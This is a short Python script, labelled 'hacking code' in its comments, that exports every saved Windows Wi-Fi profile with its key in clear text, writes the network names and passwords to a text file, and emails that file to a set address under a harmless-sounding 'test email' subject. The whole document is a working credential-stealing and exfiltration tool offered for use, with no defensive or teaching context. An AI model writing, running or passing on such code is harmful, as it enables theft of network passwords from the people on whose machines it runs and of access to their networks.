import os
import subprocess
import yagmail

# creating a file
password_file = open('passwords.txt', 'w')
password_file.write('Here are the passwords:\n\n')
password_file.close()

# lists
wifi_files = []
wifi_ssid = []
wifi_passwords = []

# executing a windows command with python
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

# getting the current directory
path = os.getcwd()

# hacking code
for file in os.listdir(path):
    if "Wi-Fi" and 'xml' in file:
        with open(file, "r") as f:
            lines = f.readlines()
            for line in lines:
                if 'name' in line:
                    clean_text = line.strip()
                    SSID = clean_text[6:-7]
            wifi_ssid.append(SSID)
            for line in lines:
                if 'keyMaterial' in line:
                    clean_text = line.strip()
                    password = clean_text[13:-14]
            wifi_passwords.append(password)

for i, j in zip(wifi_ssid, wifi_passwords):
    with open('passwords.txt', 'a') as f:
        f.write(f'SSID:{i}\npassword:{j}\n')

# Email credentials
sender_email = "sender@mail.com"
receiver_email = "receiver@mail.com"
password = "your password here"

# Initialize yagmail
yag = yagmail.SMTP(sender_email, password)

# Send the email with attachment
yag.send(
    to=receiver_email,
    subject="Test Email with Attachment",
    contents="This is a test email with a text file attachment sent from Python!",
    attachments="passwords.txt",
)

